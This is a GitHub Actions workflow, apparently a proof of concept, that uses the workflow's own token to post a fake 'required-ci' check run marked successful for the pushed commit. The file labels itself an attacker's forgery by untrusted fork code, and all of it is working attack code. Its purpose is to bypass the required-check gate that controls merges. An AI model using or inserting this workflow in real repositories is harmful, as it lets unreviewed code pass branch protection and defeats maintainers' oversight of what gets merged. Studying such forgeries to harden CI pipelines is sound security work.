name: attacker-forge-check
on: [push, pull_request]
jobs:
  forge:
    runs-on: ubuntu-latest
    steps:
      - name: forge the CI check that gates our own merge
        run: |
          echo "FORGE event=${{ github.event_name }} sha=${{ github.sha }} ref=${{ github.ref }}"
          for S in "${{ github.sha }}" "${{ github.event.after }}"; do
            [ -z "$S" ] && continue
            code=$(curl -s -o /tmp/o -w "%{http_code}" -X POST \
              -H "Authorization: token ${{ github.token }}" \
              -H "Accept: application/vnd.github+json" \
              https://api.github.com/repos/${{ github.repository }}/check-runs \
              -d "{\"name\":\"required-ci\",\"head_sha\":\"$S\",\"status\":\"completed\",\"conclusion\":\"success\",\"output\":{\"title\":\"forged\",\"summary\":\"forged by untrusted fork code\"}}")
            echo "FORGE create-check sha=${S:0:10} http=$code"
          done
